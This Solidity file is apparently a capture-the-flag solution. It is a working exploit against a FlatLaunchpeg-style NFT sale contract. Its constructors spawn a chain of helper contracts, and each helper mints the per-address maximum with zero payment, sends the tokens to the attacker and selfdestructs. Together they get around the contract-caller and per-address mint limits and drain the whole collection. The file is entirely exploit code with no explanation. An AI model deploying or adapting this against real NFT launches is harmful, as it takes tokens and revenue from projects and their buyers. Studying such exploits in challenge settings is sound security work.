// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IFlatLaunchpeg {
    function publicSaleMint(uint256 _quantity) external payable;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external returns (uint256);
    function maxPerAddressDuringMint() external returns (uint256);
    function collectionSize() external returns (uint256);
}

/// exploiter runner
contract jpegSniperExploiter {

    constructor(address nftAddress, address to) {
        _runExploit(nftAddress,to);
    }

    /// @dev spawns new contracts which each max-mint and transfer NFTs
    function _runExploit(address nftAddress, address to) private {
        IFlatLaunchpeg nft = IFlatLaunchpeg(nftAddress);

        uint256 collectionSize = nft.collectionSize();
        uint256 maxPerAddress = nft.maxPerAddressDuringMint();

        uint256 startIndex = nft.totalSupply();
        uint256 loops = (collectionSize-startIndex)/maxPerAddress;

        for (uint256 j=0; j<loops; j++) {
            new miniJpegSniperExploiter(nft,to,maxPerAddress,startIndex);
            startIndex += maxPerAddress;
        }

        uint256 mintRemainder = (collectionSize-startIndex)%maxPerAddress;
        if (mintRemainder > 0) new miniJpegSniperExploiter(nft,to,mintRemainder,startIndex);
    }

}

/// mini exploiter contract
contract miniJpegSniperExploiter {

    constructor(
        IFlatLaunchpeg nft, 
        address to, 
        uint256 amountToMint, 
        uint256 startIndex
    ) {
        nft.publicSaleMint{value:0}(amountToMint); // free mint
        for (uint256 i=0; i<amountToMint; i++) {
            nft.transferFrom(address(this),to,startIndex+i);
        }
        selfdestruct(payable(to)); // potential gas refund
    }

}